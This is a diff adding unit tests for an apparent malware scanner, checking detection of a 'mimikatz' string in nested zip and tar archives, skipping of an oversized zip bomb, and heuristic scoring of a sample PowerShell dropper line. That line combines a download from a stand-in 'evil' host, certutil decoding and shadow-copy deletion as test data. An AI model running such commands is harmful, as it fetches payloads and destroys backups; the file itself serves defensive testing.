@@ -1,5 +1,8 @@
+import io
+import tarfile
 import tempfile
 import unittest
+import zipfile
 from pathlib import Path
 
 from aidefender import heuristics, quarantine, scanner
@@ -66,6 +69,66 @@ class ScannerTest(unittest.TestCase):
         with tempfile.TemporaryDirectory() as td:
             finding = scanner.scan_file(Path(td) / "nope.bin", db=builtin_db(), cfg=make_cfg(Path(td)))
             self.assertEqual(finding.verdict, "error")
+
+    def test_zip_nested_string_signature(self):
+        with tempfile.TemporaryDirectory() as td:
+            tmp = Path(td)
+            archive = tmp / "payload.zip"
+            with zipfile.ZipFile(archive, "w") as zf:
+                zf.writestr("inner/note.txt", "this mentions mimikatz in a nested archive\n")
+            finding = scanner.scan_file(archive, db=builtin_db(), cfg=make_cfg(tmp))
+            self.assertEqual(finding.verdict, "malicious")
+            self.assertTrue(any("nested" in r and "Mimikatz" in r for r in finding.reasons))
+            all_findings = scanner.scan_path(archive, db=builtin_db(), cfg=make_cfg(tmp))
+            self.assertTrue(any(f.nested and f.verdict == "malicious" for f in all_findings))
+
+    def test_nested_zip_and_tar(self):
+        with tempfile.TemporaryDirectory() as td:
+            tmp = Path(td)
+            inner = io.BytesIO()
+            with zipfile.ZipFile(inner, "w") as zf:
+                zf.writestr("payload.txt", "nested mimikatz token\n")
+            outer = tmp / "outer.zip"
+            with zipfile.ZipFile(outer, "w") as zf:
+                zf.writestr("inner.zip", inner.getvalue())
+            finding = scanner.scan_file(outer, db=builtin_db(), cfg=make_cfg(tmp))
+            self.assertEqual(finding.verdict, "malicious")
+
+            tar_path = tmp / "payload.tar"
+            with tarfile.open(tar_path, "w") as tf:
+                data = b"tar member mentions mimikatz\n"
+                info = tarfile.TarInfo(name="member.txt")
+                info.size = len(data)
+                tf.addfile(info, io.BytesIO(data))
+            tar_finding = scanner.scan_file(tar_path, db=builtin_db(), cfg=make_cfg(tmp))
+            self.assertEqual(tar_finding.verdict, "malicious")
+
+    def test_zip_bomb_skipped_without_hang(self):
+        with tempfile.TemporaryDirectory() as td:
+            tmp = Path(td)
+            cfg = make_cfg(tmp)
+            cfg.archive_max_member_bytes = 4096
+            cfg.archive_max_total_bytes = 8192
+            archive = tmp / "bomb.zip"
+            payload = b"\x00" * 200_000
+            with zipfile.ZipFile(archive, "w", compression=zipfile.ZIP_DEFLATED) as zf:
+                zf.writestr("huge.bin", payload)
+            finding = scanner.scan_file(archive, db=builtin_db(), cfg=cfg)
+            self.assertTrue(any("archive skipped" in r for r in finding.reasons))
+            self.assertNotEqual(finding.verdict, "error")
+
+    def test_extra_dropper_tokens_surface_in_heuristics(self):
+        with tempfile.TemporaryDirectory() as td:
+            tmp = Path(td)
+            target = tmp / "dropper.ps1"
+            target.write_text(
+                "Invoke-WebRequest http://evil /; certutil -decode a b; vssadmin delete shadows\n",
+                encoding="utf-8",
+            )
+            result = heuristics.analyze_file(target)
+            self.assertGreaterEqual(result.score, 10)
+            self.assertTrue(result.features.get("tokens"))
+            self.assertTrue(any("suspicious keywords" in r for r in result.reasons))
 
 
 if __name__ == "__main__":
